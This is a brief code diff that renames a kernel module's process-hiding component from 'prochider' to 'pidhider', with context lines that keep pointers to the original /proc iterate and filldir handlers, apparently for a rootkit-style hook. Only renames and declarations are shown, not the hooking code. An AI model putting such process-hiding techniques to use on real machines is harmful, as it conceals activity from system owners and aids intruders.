@@ -1,4 +1,4 @@
-#include "prochider.h"
+#include "pidhider.h"
 
 #include "config.h"
 #include "helper.h"
@@ -99,7 +99,7 @@ static int (*orig_proc_iterate)(struct file *, struct dir_context *);
 static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type);
 
-int prochider_init(void)
+int pidhider_init(void)
 {
     void *iterate_addr;
 
@@ -143,7 +143,7 @@ int prochider_init(void)
     return 0;
 }
 
-void prochider_cleanup(void)
+void pidhider_cleanup(void)
 {
     if (proc_fops != NULL && orig_proc_iterate != NULL) {
         void *iterate_addr = orig_proc_iterate;
